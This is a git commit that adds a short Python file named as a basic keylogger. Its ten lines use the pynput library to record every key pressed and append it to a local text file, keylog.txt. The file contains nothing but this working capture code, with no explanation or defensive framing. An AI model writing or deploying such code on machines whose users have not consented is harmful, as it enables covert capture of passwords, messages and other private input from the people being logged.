33f78e82057a8525657133a2bb04271e5d50cb75
Pushparaj singh Jhala <158456288+PushprajSinghJhala@users.noreply.github.com>
2025-03-10 19:48:42 +0530

    Add files via upload

---
+++ Basic Keylogger/Basickeyloger.py
@@ -0,0 +1,10 @@
+from pynput.keyboard import Key, Listener
+
+def log_keystroke(key):
+    key = str(key).replace("'", "")  
+
+    with open("keylog.txt", "a") as file:
+        file.write(f"{key}\n")  
+
+with Listener(on_press=log_keystroke) as listener:
+    listener.join()
